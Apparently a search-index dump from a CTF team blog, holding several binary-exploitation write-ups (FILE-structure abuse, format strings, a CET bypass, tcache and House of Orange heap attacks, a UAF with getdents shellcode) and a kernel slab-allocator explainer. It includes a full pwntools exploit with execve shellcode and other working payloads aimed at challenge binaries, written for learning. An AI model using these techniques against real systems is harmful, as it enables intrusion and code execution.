add(2,0x1000)\n        edit(2,0,3991)\n\nThe next edit should take input from stdin if the file descriptor has been nulled out by that random byte.\nNow we can directly edit our file structure with our input.\nNote that here we cant go for vtable overwrite as there would be checks in glibc 2.27.\n{: .notice}\nHence we decided to achieve arbitrary write by using IO_buf_base and IO_buf_end. If we overwrite IO_buf_base with malloc/free hook and IO_buf_end with somewhere after free/malloc hook , we can write one gadget to either of these pointers.\nInitially we overwrote __malloc_hook to get shell but the constraints of one_gadget wouldn't satisfy hence we tried overwriting free_hook with system and overwrite file pointer magic number with /bin/sh to get shell in internals of fclose but the problem was that , on server the magic number was not overwritten with /bin/sh rather it executed system(magic_num) which didnt give us shell. \nFinally overwriting free_hook with a suitable gadget only gave shell.\nHere's the rest of the script\n        #Overwriting buf_base and buf_end with free_hook and region nearby\n        buf_base = libc_base + 0x3ebc30\n        buf_end = libc_base + 0x3ebd40\n        gdb.attach(io)\n        #Finally calling edit to take input at file structure from stdin\n        edit(1,-4616,16)\n        payload = p64(buf_base) + p64(buf_end)\n        io.sendline(payload)\n        one_gadget = libc_base + 0x10a38c\n        #Now we write to free_hook\n        edit(1,-4688,8)\n        payload = p64(one_gadget)+\"a\"*8 + p64(one_gadget)\n        io.sendline(payload)\n        gdb.attach(io)\n        fclose()\n    else:\n        log.info('Restart Exploit')\n    io.interactive()\n\n\nCONCLUSION\nI really liked the idea of writing just one null byte using /dev/urandom and then brute forcing to get shell.\nEnjoyed solving the challenge, credits to sherl0ck for the idea.\nHere's the script.\n","id":"https://pwnverse.github.io/posts/rbsystem/","title":"Cyber Mimic 2020 Rbsystem Writeup"},"https://pwnverse.github.io/posts/simple-echoserver/":{"body":"We had great time playing this year's edition of 0CTF 2020.

Nevertheless , here's the intended solution for the challenge.\nTL;DR OF THE CHALLENGE BINARY\nWe've been provided with standard x86 64-bit Dynamically Linked binary along with glibc 2.27 to start with.\nHere's what checksec has to say -\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : FULL\n\nLet's reverse this now.\nREVERSING\nThe binary is a fairly simple one asking us for name and phone number which it stores on stack and then performs fprintf of name through stderr. An important thing to note is that stderr is being directed to /dev/null on server and hence the binary won't print out name , thereby preventing leaks.\nThe bug lies in the fprintf where we encounter the infamous Format String Vulnerability.\nThe function asking for Details -&gt;\n puts(\"For audit, please provide your name and phone number: \");\n  printf(\"Your name: \");\n  read_name((_BYTE *)a1, 256);\n  printf(\"Your phone: \", 256LL);\n  result = read_num();\n  *(_QWORD *)(a1 + 256) = result;\n  return result;\n\n\nThis is the function which contains our vulnerable fprintf\n snprintf((char *)0x555555558060LL, 0x100uLL, \"[USER] name: %s; phone: %ld\\n\", a1, *(_QWORD *)(a1 + 256));\n  return fprintf(MEMORY[0x555555558040], (const char *)0x555555558060LL);\n\nAfter this , the program loops and echo's whatever we give as input without any vulnerabilities.\n    puts(\"Now enjoy yourself\");\n    while(1)\n    {\n        read_name(&amp;s1,256);\n        if(!strcmp(&amp;s1,\"~.\"))\n            break;\n        printf(\"%s\",&amp;s1);\n    }\n\nEXPLOIT IDEA AND ANALYSIS\nWell , initially we planned to do File Structure overwrite by corrupting stderr's file_no field with 1 and calling main again would print leaks.

So why this object based allocation one may ask?\nWithout an object based allocator , the kernel will spend more time in allocation , initializing and freeing the same object.\n{: .notice}\nThe slab allocator consists of a variable number of caches that are linked together on a circular doubly linked list called cache chain. Each cache maintains blocks of contiguous pages in memory called slabs.\n\nPrinciples of Slab allocator\n\nThe allocation of small blocks of memory to help eliminate internal fragmentation.\nCaching of commonly used objects so that the kernel doesnt waste time.\nBetter utilization of hardware cache by aligning objects to the L1 or L2 caches.\n\nIn a general sense , the slab allocator in sits on top of a bump allocator called buddy allocator and makes sure that commonly used objects are cached.\nThe slab allocator provides Dedicated and generic cache classes. The separation between cache classes can be seen in a proc file called /proc/slabinfo.\nInterfaces of kernel memory allocation\nkmalloc is the general interface the kernel provides to do generic allocations through slab allocator. There are also others like kzalloc (similar to glibc calloc) and krealloc.\nHow does a heap chunk look like in the kernel?\nWith the slab allocator , kmalloc'd chunks dont have any metadata like headers for size in glibc. The free chunks obviously are stored in a single linked list.\n\nA slab allocator interface like kmalloc searches the right kmem_cache structure that serves a given size of allocation.\n\nA little exploration of the source code\nFor sizes less than or equal to 192, kmalloc maintains immediate caches of sizes of range 8 to 192.\nstatic __always_inline void *__do_kmalloc(size_t size, gfp_t flags,\n\t\t\t\t\t  unsigned long caller)\n{\n\tstruct kmem_cache *cachep;\n\tvoid *ret;\n\n\tif (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))\n\t\treturn NULL;\n\tcachep = kmalloc_slab(size, flags);\n\tif (unlikely(ZERO_OR_NULL_PTR(cachep)))\n\t\treturn cachep;\n\tret = slab_alloc(cachep, flags, caller);\n\n\tret = kasan_kmalloc(cachep, ret, size, flags);\n\ttrace_kmalloc(caller, ret,\n\t\t      size, cachep-&gt;size, flags);\n\n\treturn ret;\n}\n\nThe call to kmalloc_slab is demonstrated.\nstruct kmem_cache *kmalloc_slab(size_t size, gfp_t flags)\n{\n\tunsigned int index;\n\n\tif (size &lt;= 192) {\n\t\tif (!size)\n\t\t\treturn ZERO_SIZE_PTR;\n\n\t\tindex = size_index[size_index_elem(size)];\n\t} else {\n\t\tif (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))\n\t\t\treturn NULL;\n\t\tindex = fls(size - 1);\n\t}\n\n\treturn kmalloc_caches[kmalloc_type(flags)][index];\n}\n\n\nIf requested size is greater than KMALLOC_MAX_CACHE_SIZE which is the size of two pages 8192 , then a call to kmalloc_large is made.\nThe call to kmalloc_slab gets a cache pool using size based indexing.\n\nThe slub_alloc calls another function slab_alloc_node.\nstatic __always_inline void *slab_alloc(struct kmem_cache *s,\n\t\tgfp_t gfpflags, unsigned long addr)\n{\n\treturn slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);\n}\n\n\nHere, the variable NUMA_NO_NODE that is Non uniform memory access cells. \nFrom a hardware aspect, a NUMA system can be assumed to be cells of memory each of which is in itself a symmetric memory processor subset of the system. They provide a scalable memory bandwidth.\n{: .notice}\nstatic __always_inline void *slab_alloc_node(struct kmem_cache *s,\n\t\tgfp_t gfpflags, int node, unsigned long addr)\n{\n\tvoid *object;\n\tstruct kmem_cache_cpu *c;\n\tstruct page *page;\n\tunsigned long tid;\n\tstruct obj_cgroup *objcg = NULL;\n\n\ts = slab_pre_alloc_hook(s, &amp;objcg, 1, gfpflags);\n    if(!s)\n        return NULL;\n    ...\n    ...\n\nLet us dive into the slab_pre_alloc_hook.\nstatic inline struct kmem_cache *slab_pre_alloc_hook(struct kmem_cache *s,\n\t\t\t\t\t\t     gfp_t flags)\n{\n\tflags &amp;= gfp_allowed_mask;\n\tlockdep_trace_alloc(flags);\n\tmight_sleep_if(gfpflags_allow_blocking(flags));\n\n\tif (should_failslab(s-&gt;object_size, flags, s-&gt;flags))\n\t\treturn NULL;\n\n\treturn memcg_kmem_get_cache(s, flags);\n}\n\nMasking of bits is done to ensure that the relevant operation is dont. The more interesting part is the might_sleep_if function which actually returns a boolean value to decide whether the given flag can cause a sleep or not.\nstatic inline bool gfpflags_allow_blocking(const gfp_t gfp_flags)\n{\n\treturn (bool __force)(gfp_flags &amp; __GFP_DIRECT_RECLAIM);\n}\n\nThe GFP_KERNEL flag is actually flag obtained by or'ing 3 lower level flags.\n#define __GFP_DIRECT_RECLAIM\t((__force gfp_t)___GFP_DIRECT_RECLAIM) /* Caller can reclaim */\n#define __GFP_RECLAIM ((__force gfp_t)(___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM))\n#define GFP_KERNEL\t(__GFP_RECLAIM | __GFP_IO | __GFP_FS)\n\nThis means, our gfpflags_allow_blocking will return a true with GFP_KERNEL. This makes sense as getting a free slab may require time and if we sleep , we can give our processor to switch to another task in the meanwhile.\nOk so back to slab_alloc_node, the next section is - \nredo:\n\t/*\n\t * Must read kmem_cache cpu data via this cpu ptr.

Slab object queues exist per node per CPU. For very large systems, such queues may grow exponentially and hence at some point of processing , may consume the entire system memory which is not what we need.\nHence , the need of a more scalable allocator was the need of the hour.\nThe SLUB Allocator\nIt keeps the same inner principles of the SLAB allocator but drops the requirements of the complex queues and per slab metadata. Information about all the active slabs is kept in the kmem_cache structure. Per-slab metadata is kept  in three basic fields \nvoid *freelist;\nshort unsigned int inuse;\nshort unsigned int offset;\n\n\n\n\nFreelist is the pointer to the first free chunk in the slab.\n\n\ninuse is the count of number of objects being used.\n\n\noffset is offset to the next free chunk.\n\n\nSLUB also introduces the coalescing of slabs which greatly reduces the memory overhead.\nConclusion\nThe implementation of kmalloc is a very interesting process of linux kernel memory management. The techniques employed to implement kmalloc are quite fascinating and thought provoking. \nHere are the references to everything covered in this post :\n\nSource Code\nAn awesome post on kmalloc internals\nA little on NUMA\n\n","id":"https://pwnverse.github.io/posts/slaballocator/","title":"Allocators of the Linux Kernel"},"https://pwnverse.github.io/posts/smash/":{"body":"tl;dr\n\nLeak with Format String bug.\nUse the arbitrary heap pointer write to overwrite __GI__IO_file_jumps.\nInject shellode in heap and get code execution in dfprintf.\n\n&lt;i!--more--&gt;\nChallenge Points: 388\nSolves: 9\nWe really had a great time this weekend playing this year's edition of TokyoWesterns CTF. In this post I'd like to share the intended solution for the challenge Smash which we could not solve during the CTF but the idea and the concept involved is worth sharing.\nChallenge description\nTo begin with , we've been provided with the challenge binary , libc 2.31, a runner bash script and a folder containing Intel's tool called Control-flow Enforcement Technology (CET).This was our first tackel with Intel's CET and the concept involved is truly worth sharing. \ngdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : ENABLED\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : FULL\n\nAll mitigations except canary have been enabled.\nReversing\n\nThe input name function takes 0x20 bytes of user input and then does an strdup which stores our input on heap.\nNext , dprintf is called on our input without any format specifier, hence we can leak required addresses with the format string bug.\nAfter this , we're asked to enter y or n and if y is entered , the program further asks for another input message and then takes in another 0x38 bytes of input.\nIf n is entered , the program prints Bye with dprintf and directly exits.\n\nPretty straight forward, but where are the bugs?\nExploit development\nWe actually have 2 overflows which let us corrupt rbp and pivot to almost anywhere, but wait, CET doesn't allow us to execute ROP chain directly. We have to find a way to get code execution.\nHow Intel's CET works\nControl-Flow Enforcement Technology promises to guard a binary against attacks such as ROP, JOP etc. It does so by allocating a shadow stack in mapped memory region. Whenever a function is called, apart from storing the return address on the program's thread stack , it also stores it on the shadow stack. So whenever the program returns from the function, the return address is comapared with the one stored on the shadow stack , if a match is found, the program executes smoothly,  and if not , the program aborts thus mitigating ROP.\nIntel SDE provides an emulation that includes:\n\nStack checks\nIndirect branch checks\n\nFrom the above discussion, one thing gets clear , every function that is executed in the supervision of CET needs to begin with endbr64. Let's just bear that in mind and continue.\nIn search of arbitrary write\nSince we have our required leaks , we can now corrupt rbp with our first overflow in the step where program asks us to enter y or n. \nAn important observation to be made here is that , after reading our input and storing on heap with strdup, the program copies the heap pointer to an offset of rbp-0x8.\nSince , we overwrote rbp with an address of our choice , after the function executes leave , the rbp will be updated with the value that we specified.\nImmediately after that, the following instructions copy the heap pointer storing our input to rbp-0x8.\nmov    QWORD PTR [rbp-0x8],rax\nmov    rax,QWORD PTR [rbp-0x8]\n\nThus , we have an arbitrary write of a heap pointer.\nDefeating CET\nAfter analyzing a bit ,  we found out that the emulator that the CTF has provided us with does not check for the NX bit and few pages have been marked read-write-executable allowing us to now inject shellcode.\nNow that we can execute shellode, we have to now select a target to get code execution.\ndprintf to the rescue\nOne important aspect of dprintf is that it uses a temporary file structure to carry out it's operations. With file structure operations, we can find out apt targets to get code execution. One such target function pointer is _IO_new_file_finish which is called internally inside dprintf. \nSo , now our plan is :\n\nOverwrite rbp to point to _IO_new_file_finish + 8.\nCopy heap address to _IO_new_file_finish.\nFill heap with shellcode as CET doesn't implement NX.\nGet code execution in dprintf.\n\nHere's the full exploit code.\n\nfrom pwn import *\nimport sys\n\nLIBC = ELF('./libc-2.31.so',checksec = False)\nif(len(sys.argv)&gt;1):\n    io=remote(\"pwn01.chal.ctf.westerns.tokyo\",29246)\n    context.noptrace = True\nelse:\n    io=process(\"./smash\")\n\nreu = lambda a : io.recvuntil(a)\nsla = lambda a,b : io.sendlineafter(a,b)\nsl = lambda a : io.sendline(a)\nrel = lambda : io.recvline()\nsa = lambda a,b : io.sendafter(a,b)\nre = lambda a : io.recv(a)\ns = lambda a : io.send(a)\n\n\nif __name__ == \"__main__\":\n    gdb.attach(io)\n    sla('&gt; ','%p '*9)\n    re(55)\n    stack = int(re(14),16)\n    log.info(\"stack = \" + hex(stack))\n    re(1)\n    code = int(re(14),16) - 0x1216\n    log.info(\"code = \" + hex(code))\n    re(7)\n    libc = int(re(14),16) - 0x270b3\n    log.info(\"libc = \" + hex(libc))\n    target_stack = code + 0x40e8 #to be changed\n    inp = stack - 0x60\n    IO_file_jumps = libc + 0x1ed4a0\n    pop_rdi = code + 0x000013d3\n    payload  = b\"\\xf3\\x0f\\x1e\\xfa\" # endbr64\n    payload += b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"\n    payload += b\"\\x90\" * (0x30 - len(payload))\n    payload += p64(IO_file_jumps + 0x10 + 8)[:6]\n    sa('[y/n] ',payload)\n    #sla('message &gt; ','write to shadow')\n    io.interactive()\n\nRemember that the shellcode has to be started with endbr64 instruction to bypass the indirect branch instruction check.\n[+] Opening connection to pwn01.chal.ctf.westerns.tokyo on port 29246: Done\n[!] Skipping debug attach since context.noptrace==True\n[*] stack = 0x7fffc7eb4d00\n[*] code = 0x55a74550c000\n[*] libc = 0x7f498f5bb000\n[*] Switching to interactive mode\n\nBye!\n$ ls\nflag.txt\nrun.sh\nsde\nsde.tgz\nsmash\n$ cat flag.txt\nTWCTF{17_15_ju57_4n_3mul470r,n07_r34l_CET}\n\nConclusion\nThis was one of the most interesting challenges I had come across in a while.

To do that , we have our potential candidates in bss , yes , you guessed it right , the file pointers in bss.\nHere's what we're upto right now -&gt;\n\nGet allocation on tcache , overwrite fd of one chunk and finally get the pointer to libc to leak it out.\nWe need to setup our allocated_count in such a way that we can offset to our desired tcache with stack[allocated_count++].\n\nTo offset to tcache , we call do_worksheet and change our allocated_count to -&gt;\nallocated_count - (tcache-stack)/8\n{: .notice}\nstack = 0x404060\ntcache = heap_base + 0x248  #Corresponds to tcache of 0x400\nallocated_count = heap_base + 0x470\noffset = (tcache - stack)/8 \nchange = allocated_count - offset\ndo_work(change)\n\n\nThis will subtract our allocated count with change and hence when the next allocation happens , we get allocation on tcache.\nYou can play around with the offset calculation if you didnt get it yet , its not that tough to understand :).\nWe now change the fd of our allocated chunk and then get back the libc pointer whose data we can leak.\n   add(0x400,p32(0x404030))\n   do_work(offset+0x5)\n\nWe change the allocated_count back to negetive 4 so that we get next allocation on allocated_count itself and repeat the above process to get allocation on another tcache.\n    add(0x200,'a') #Get allocation on allocated count\n    allocated_count_new1 = heap_base + 0xb91\n    tcache_new = heap_base + 0x148  #This time target another tcache of 0x200\n    offset_new = (tcache_new - stack)/8\n    k = allocated_count_new1 - offset_new\n    do_work(k)\n    add(0x200,p64(0x404030))\n\nAs u can see , tcache of 0x200 and 0x400 are successfully populated with our pointers.\n0x405000:\t0x0000000000000000\t0x0000000000000251\n0x405010:\t0x0000000000000000\t0x0000000000000000\n0x405020:\t0x0000000000000000\t0x0000000000000000\n0x405030:\t0x0000000000000000\t0x0000000000000000\n0x405040:\t0x0000000000000000\t0x0000000000000000\n0x405050:\t0x0000000000000000\t0x0000000000000000\n0x405060:\t0x0000000000000000\t0x0000000000000000\n0x405070:\t0x0000000000000000\t0x0000000000000000\n0x405080:\t0x0000000000000000\t0x0000000000000000\n0x405090:\t0x0000000000000000\t0x0000000000000000\n0x4050a0:\t0x0000000000000000\t0x0000000000000000\n0x4050b0:\t0x0000000000000000\t0x0000000000000000\n0x4050c0:\t0x0000000000000000\t0x0000000000000000\n0x4050d0:\t0x0000000000000000\t0x0000000000000000\n0x4050e0:\t0x0000000000000000\t0x0000000000000000\n0x4050f0:\t0x0000000000000000\t0x0000000000000000\n0x405100:\t0x0000000000000000\t0x0000000000000000\n0x405110:\t0x0000000000000000\t0x0000000000000000\n0x405120:\t0x0000000000000000\t0x0000000000000000\n0x405130:\t0x0000000000000000\t0x0000000000000000\n0x405140:\t0x0000000000000000\t0x0000000000405da0 -&gt;

We also tried with exit pointers in libc bss but with no luck.\nHence the only idea that was left worth trying was overwriting the IO_list_all pointer to invoke House Of Orange attack.\nLet's have a look at the procedure in which we can trigger HOO.\n\n\nWhen malloc detects an error in the linked lists, like a corrupted fd and bk pointers, it aborts and calls a function _IO_flush_all_lockp.\n\n\nThis function is used to close all the file pointers such as stdout, stderr etc.\n\n\nIt does the same by using a global pointer called _IO_list_all that contains the pointer to the stdout/stderr file pointer.\n\n\nThe file pointer structures contain a pointer to the next file pointer. The function uses this to iteratively close all the file pointers used.\n\n\nNow, these file pointers have jump tables that are used if some pre-conditions are met.\n\n\nSo, the idea is to overwrite the _IO_list_all pointer and point it to a location we control.\n\n\nWe overwrite the \\IO_list_all with a pointer to the main_arena.\n\n\nBy correctly setting the size of the chunk in the free list, we can make sure that the next file pointer accessed will be the chunk in the free list.\n\n\nSo, in order to overwrite the _IO_list_all with a pointer to the main_arena, we use the unlink vulnerability.\n\n\nWhen a chunk in the free list is to be splitted off to service a malloc request, the code that gets executed is as follows\nunsorted_chunks (av)-&gt;bk = bck;\nbck-&gt;fd = unsorted_chunks (av);\n\n\nSo, the fd pointer of previous chunk get’s overwritten with an address in the main_arena.\nIf we set the previous chunk to be _IO_list_all – 0x10, then bck-&gt;fd will be the _IO_list_all pointer.\nIn brief , all we need to do is\n\n\nCorrupt bck pointer of free chunk to point to _IO_list_all – 0x10.\n\n\nSet size of chunk such that the second file pointer accessed is under users control. (0x61 is one such value)\n\n\nSo now the problem is we dont have control over size of the chunk we allocate , and hence in this case , we need to create overlapping chunks in such a way that we get control over size , fd and bk of a free chunk.\nAt this point , we have 3 chunks in free list , 2 of which are in unsorted bin.\n0000| 0x564dac5fd150 --&gt; 0x564dacc41520 --&gt; 0xa62626262 ('bbbb\\n')\n0008| 0x564dac5fd158 --&gt; 0x1 \n0016| 0x564dac5fd160 --&gt; 0x564dacc41f40 --&gt; 0xa64646464 ('dddd\\n')\n0024| 0x564dac5fd168 --&gt; 0x1 \n0032| 0x564dac5fd170 --&gt; 0x564dacc42960 --&gt; 0xa66666666 ('ffff\\n')\n0040| 0x564dac5fd178 --&gt; 0x1 \n0048| 0x564dac5fd180 --&gt; 0x564dacc42e70 --&gt; 0xa67676767 ('gggg\\n')\n0056| 0x564dac5fd188 --&gt; 0x1 \n0064| 0x564dac5fd190 --&gt; 0x564dacc43380 --&gt; 0xa68686868 ('hhhh\\n')\n0072| 0x564dac5fd198 --&gt; 0x1 \n0080| 0x564dac5fd1a0 --&gt; 0x564dacc42450 --&gt; 0x564dacc41a20 --&gt; 0x0  -&gt; This is in unsorted bin\n0088| 0x564dac5fd1a8 --&gt; 0x1 \n0096| 0x564dac5fd1b0 --&gt; 0x564dacc41a30 --&gt; 0x564dacc41000 --&gt; 0x0  -&gt; we edit this chunk's fd to our fake chunk\n0104| 0x564dac5fd1b8 --&gt; 0x1 \n0112| 0x564dac5fd1c0 --&gt; 0x564dacc41010 --&gt; 0x7f0e3ab4bb78 --&gt; 0x564dacc43880 --&gt; 0x0 -&gt; This is also in unsorted bin\n0120| 0x564dac5fd1c8 --&gt; 0x1 \n\n\nLet's script what we desire\n\n    IO_list  = libc_base + libc.symbols['_IO_list_all']\n    bk = heap_base + 0x1960\n    fd = heap_base + 0x1440 - 0x8\n    edit('y',7,p64(fd) + p64(bk))\n    gdb.attach(io)\n\n\nAnd see how the chunks look like -&gt;\n0000| 0x561a4bb48150 --&gt; 0x561a4d2e4520 --&gt; 0xa62626262 ('bbbb\\n')\n0008| 0x561a4bb48158 --&gt; 0x1 \n0016| 0x561a4bb48160 --&gt; 0x561a4d2e4f40 --&gt; 0xa64646464 ('dddd\\n')\n0024| 0x561a4bb48168 --&gt; 0x1 \n0032| 0x561a4bb48170 --&gt; 0x561a4d2e5960 --&gt; 0xa66666666 ('ffff\\n')                   -&gt; This is chunk 3 , our supposed fake chunk\n0040| 0x561a4bb48178 --&gt; 0x1 \n0048| 0x561a4bb48180 --&gt; 0x561a4d2e5e70 --&gt; 0xa67676767 ('gggg\\n')\n0056| 0x561a4bb48188 --&gt; 0x1 \n0064| 0x561a4bb48190 --&gt; 0x561a4d2e6380 --&gt; 0xa68686868 ('hhhh\\n')\n0072| 0x561a4bb48198 --&gt; 0x1 \n0080| 0x561a4bb481a0 --&gt; 0x561a4d2e5450 --&gt; 0x561a4d2e4a20 --&gt; 0x0 \n0088| 0x561a4bb481a8 --&gt; 0x1 \n0096| 0x561a4bb481b0 --&gt; 0x561a4d2e4a30 --&gt; 0x561a4d2e5960 --&gt; 0xa66666666 ('ffff\\n') -&gt; Clean , we overwrote fd with chunk 3's addr\n0104| 0x561a4bb481b8 --&gt; 0x1 \n0112| 0x561a4bb481c0 --&gt; 0x561a4d2e4010 --&gt; 0x7fdc8f575b78 --&gt; 0x561a4d2e6880 --&gt; 0x0 \n\n\nNow we edit chunk 3 and fake our chunk there.\nWe create our fake chunk in our chunk 3 , so that we can overwrite the size of the next chunk.\n\n    bk = IO_list - 0x10\n    fd = heap_base + 0xa20\n    edit('y',3,p64(0) + p64(0x511) + p64(fd) + p64(bk))\n    gdb.attach(io)\n\n\nLet's see how chunk 3 looks like now.\n\n0x561a3e08d950:\t0x0000000000000510\t0x0000000000000510 \n0x561a3e08d960:\t0x0000000000000000\t0x0000000000000511 -&gt; Fake chunk header\n0x561a3e08d970:\t0x0000561a3e08ca20\t0x00007fc7d9e04510 -&gt; fd and bk set appropriately\n0x561a3e08d980:\t0x000000000000000a\t0x0000000000000000\n\n\nWell , its time to trigger overwrite of IO_list_all pointer by mallocing 2 chunks.\nThe third call to malloc should return our fake chunk.\n    #Get stuff back from unsorted bin\n    add(\"third\",\"aaaa\")\n    add(\"third\",\"bbbb\")\n    #Finally get back our fake chunk and overwrite the size of the next chunk with 0x91\n    payload = 'f'*8 + p64(0)*(0x500-0x8)/8 + p64(0) + p64(0x91)\n    add(\"third\",payload)\n\n\nWith this , we successfully faked the size of a valid chunk.\n0x555555759e60:\t0x0000000000000000\t0x0000000000000091\n0x555555759e70:\t0x0000000a67676767\t0x0000000000000001\n\n\nLooks like our fake chunk is in second user's area.

The libc provided inside the docker was 2.32.\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : FULL\n\nReversing\nSince source code was provided , it was pretty self explanatory. The program implements seccomp rules and the following system calls have been allowed.\n\tAllow(brk),\n\tAllow(mmap),\n\tAllow(exit_group),\n\tAllow(mmap),\n\tAllow(munmap),\n\tAllow(read),\n\tAllow(write),\n\tAllow(getdents),\n\tAllow(mprotect),\n\tAllow(open),\n\tAllow(sendfile),\n\nThe program implements the structure of a custom chunk provided by malloc.\ntypedef struct _chunk {\n\tuint32_t size;\n\tvoid * ptr;\n\tbool in_use;\n} chunk;\n\nIt has size, a void* ptr and a flag in_use.\nAlloc :\n\nThe maximum size of an allocated chunk should not exceed 0x400.\nAfter allocation, chunk's first field ptr is set to NULL , data is read into the memory.\nSubsequently , the in_use flag is set to true and size is set.\n\nDelete : \n\nidx should be less than or equal to 0x10.\nThis option prints data and then frees the memory without nulling out the pointer.\nFinally , it sets the in_use flag to false.\n\nEdit :\n\nLets us edit a byte of a chunk at an index only once.\n\nBug\nThe Delete option has a simple Use after free.\nGetting heap and libc leak\nWe can only view a chunk we are about to free. To get libc leak , we can simply fill a tcache bin corresponding to small bin size. Then, after we have a chunk in the unsorted bin  ,we can add a small chunk , which will be allocated from the unsorted bin , free it to get libc.\nFor heap , its actually a little more complicated than we expected. Since libc is 2.32 , the fd pointer of a tcache chunk will be encoded with this algorithm.\n\n{: .image-pull-right}\nWe can't use tcache bins to leak heap as in tcache , the first 8 bytes will be encoded , and the next 8 bytes which stores the address of tcache structure. Moreover , the malloc algorithm clears the address of tcache structure and hence , we can't leak heap.So , our only option is to use unsorted bins as malloc does not clear addresses of unsorted bin. If we send two chunks into unsorted bin , the fd and bk pointers will be libc and heap. So , there's a chance we can leak libc here.\nWhen we allocate memory from unsorted bin , for some reason , it replaces the heap pointer with a libc pointer thus taking us further away from leaking heap.\nDuring the CTF , we were stuck here for sometime. Soon enough , we realized that if we can merge two unsorted bin chunks , the fd and bk of the chunk being merged are not cleared. Hence , in the next allocation ,we can actually overlap with our heap leak.\n0x561195df27b0:\t0x0000000000000000\t0x0000000000000141 -&gt; consolidated unsorted bin ( 0xa0 + 0xa0 )\n0x561195df27c0:\t0x0000561195df26f0\t0x00007f0be6ddec00\n0x561195df27d0:\t0x0000000000000000\t0x0000000000000000\n0x561195df27e0:\t0x0000000000000000\t0x0000000000000000\n0x561195df27f0:\t0x0000000000000000\t0x0000000000000000\n0x561195df2800:\t0x0000000000000000\t0x0000000000000000\n0x561195df2810:\t0x0000000000000000\t0x0000000000000000\n0x561195df2820:\t0x0000000000000000\t0x0000000000000000\n0x561195df2830:\t0x0000000000000000\t0x0000000000000000\n0x561195df2840:\t0x0000000000000000\t0x0000000000000000\n0x561195df2850:\t0x0000000000000000\t0x00000000000000a1 -&gt; Overlapping chunk that is merged with the above chunk\n0x561195df2860:\t0x0000561195df26f0\t0x00007f0be6ddec00 -&gt; fd (heap) and bk are not cleared\n0x561195df2870:\t0x0000000000000000\t0x0000000000000000\n0x561195df2880:\t0x0000000000000000\t0x0000000000000000\n0x561195df2890:\t0x0000000000000000\t0x0000000000000000\n0x561195df28a0:\t0x0000000000000000\t0x0000000000000000\n0x561195df28b0:\t0x0000000000000000\t0x0000000000000000\n0x561195df28c0:\t0x0000000000000000\t0x0000000000000000\n0x561195df28d0:\t0x0000000000000000\t0x0000000000000000\n0x561195df28e0:\t0x0000000000000000\t0x0000000000000000\n0x561195df28f0:\t0x0000000000000140\t0x0000000000000020\n\nNow , we can fill memory until the heap address , and then free it to leak heap.\nAllocation at stack\nWe have libc and heap leaks ,now what? The next step is to use our vulnerable edit function to edit a byte of forward pointer. We could choose to target malloc or free hook , but remember , there's seccomp enabled and I honestly was too lazy to find gadgets for following a jump oriented programming approach with complex rop.\nSo again , we were stuck at this point. One idea which we were pondering upon was to get allocation at stdout vtables [vtables are writeable in libc 2.32 surprisingly]. We could get code execution multiple times , but we could not chain any stack pivoting gadgets since registers were being corrupted before getting code execution multiple times. Hence,  we had to drop this idea as well.\nFinally , we planned to get allocation at tcache structure. We can do something like this. \n\nEdit the last byte of a free chunk to point to a fake chunk whose fd pointer is encoded with the address of tcache structure.\n\nThis way , we had leveraged arbitrary write using a single byte edit. But , we needed more than one arbitrary writes , the answer to which was the tcache structure.\nWe could free the tcache structure and reallocate it to edit it as many times as we want.\nOur idea was to get allocation the return address of the alloc function so that we can rop and mprotect heap to get shellcode execution. For that , what we can do is -\n\nEdit tcache count and the corresponding tcache entry to that count with the address of stdout file structure.\nGet allocation at stdout , the plan is to leak stack from environ. \nOverwrite stdout-&gt;flags with 0xfbad3887 \nOverwrite IO_read_ptr , IO_read_end and _IO_read_base with NULL.\nOverwrite IO_write_base with address of environ.\nOverwrite IO_write_end with address of environ+0x10.\n\nDetailed information about arbitrary memory read from file structures here\nAwesome , we have stack leak , now , re-edit tcache structure to get allocation at return address. Make sure the stack address should be 16-byte aligned else malloc will abort due to alignment issues.\nShellcode and flag\nAll set and done , we get allocation at return address. From here , it's a fairly simple problem to mprotect heap and give an orw shellcode. But wait , there is one problem.\nLooking at the Dockerfile we saw , this line\nCMD mv /home/ctf/flag.txt /home/ctf/[REDACTED]_flag.txt\n\nSo , the flag file name is unknown now. Looking at seccomp filters , we see that , we have getdents syscall allowed which is exactly what we need now. \nGetdents allows us to list all files in a directory. We will choose . directory and get all file names.\nThe shellcode for getdents is \n\n        /* open('.') */\n        mov rdi, 0x2e\n        push 0\n        push rdi\n        push rsp\n        pop rdi\n        mov rax, 2\n        xor rsi, rsi\n        cdq\n        syscall\n\n        /* getdents */\n        mov rdi, rax\n        mov rax, 0x4e\n        lea rsi, [rbp-0x70]\n        cdq\n        mov dh, 0x10\n        syscall\n\n        /* write */\n        mov rdi, 1\n        lea rsi, [rbp-0x70]\n        mov rdx, rax\n        mov rax, 1\n        syscall\n\nOnce , we get the flag file name , we can do a simple orw shellcode.\nPS : In the end , we found out that flag file name is /home/ctf/flag.txt itself , which was pretty frustrating :/\nConclusion\nThere could have been many possibilities to mprotect and execute shellcode , we choose the good old stack to get it done. All in all , it was a really good challenge.\nHere is the exploit script.\n","id":"https://pwnverse.github.io/posts/uaf/","title":"UAF - HackTheBox 2020"},"https://pwnverse.github.io/posts/userfaultfd/":{"body":"Linux provides a bunch of syscalls among which only a few are known and used often.Most of the syscalls we use are always wrapped around cheesy glibc wrappers (functions). But there are a few syscalls which have no such glibc wrappers and one of the most interesting of them is the Userfaultfd syscall.\nHence , I dedicate this post to kind of clear my own bemusement of this wonderful syscall.\nOk so the very first thing that comes to the mind of any layperson.\nWHAT IS USERFAULTFD SYSCALL\nI would like to shamelessly site the definition of userfaultfd from its very own man page (trust me, there's no better definition available other than this one :).\nuserfaultfd()  creates a new userfaultfd object that can be used for delegation of page-fault handling\nto a user-space application, and returns a file descriptor that refers to the  new  